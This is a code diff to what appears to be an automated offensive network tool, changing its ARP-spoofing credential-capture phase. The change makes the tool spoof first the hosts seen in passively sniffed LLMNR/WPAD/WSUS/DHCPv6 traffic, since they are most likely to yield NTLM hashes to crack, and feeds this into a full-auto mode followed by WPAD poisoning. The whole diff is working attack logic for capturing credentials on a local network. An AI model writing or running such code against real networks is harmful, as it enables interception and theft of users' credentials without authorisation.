@@ -1066,8 +1066,14 @@ def try_crack_hashes(cfg: Config) -> Optional[tuple[str, str, str]]:
     return None
 
 
-def run_arp_capture(cfg: Config) -> bool:
-    """ARP spoof subnet to capture and crack NTLM hashes. Sets cfg creds on success."""
+def run_arp_capture(cfg: Config, priority_hosts: list[str] | None = None) -> bool:
+    """ARP spoof subnet to capture and crack NTLM hashes. Sets cfg creds on success.
+
+    Args:
+        priority_hosts: Hosts from passive sniffing that are actively sending
+                       LLMNR/WPAD/WSUS/DHCPv6 traffic — these are spoofed first
+                       since they're most likely to yield NTLM auth.
+    """
     phase_header("PHASE 0: ZERO-AUTH CREDENTIAL CAPTURE (ARP SPOOF)")
 
     targets = []
@@ -1081,6 +1087,16 @@ def run_arp_capture(cfg: Config) -> bool:
 
     if not targets:
         return False
+
+    # Prioritize hosts from passive sniffing (they're actively authenticating)
+    if priority_hosts:
+        priority = [h for h in priority_hosts if h in targets and h != cfg.attacker_ip]
+        rest = [h for h in targets if h not in priority]
+        if priority:
+            ok(f"Prioritizing {len(priority)} host(s) detected by passive sniff")
+            for h in priority:
+                detail(h)
+            targets = priority + rest
 
     total = len(targets)
     for i, host in enumerate(targets, 1):
@@ -4819,8 +4835,15 @@ def run_full_auto(cfg: Config):
     if not wpad_viable and not wsus_viable and not pxe_viable:
         log.info("No WPAD/WSUS/PXE traffic seen passively — will still attempt active attacks")
 
-    # Step 1-3: ARP capture + crack
-    got_creds = run_arp_capture(cfg)
+    # Collect all hosts seen in passive sniff — prioritize for ARP spoofing
+    sniffed_hosts = set()
+    for key in sniff_results:
+        sniffed_hosts.update(sniff_results[key])
+    sniffed_hosts.discard(cfg.attacker_ip)
+    sniffed_hosts.discard(cfg.gateway)
+
+    # Step 1-3: ARP capture + crack (prioritize sniffed hosts)
+    got_creds = run_arp_capture(cfg, priority_hosts=sorted(sniffed_hosts) if sniffed_hosts else None)
 
     # Step 3b: WPAD poisoning (prioritize if passive sniff detected traffic)
     if not got_creds and not cfg.no_wpad:
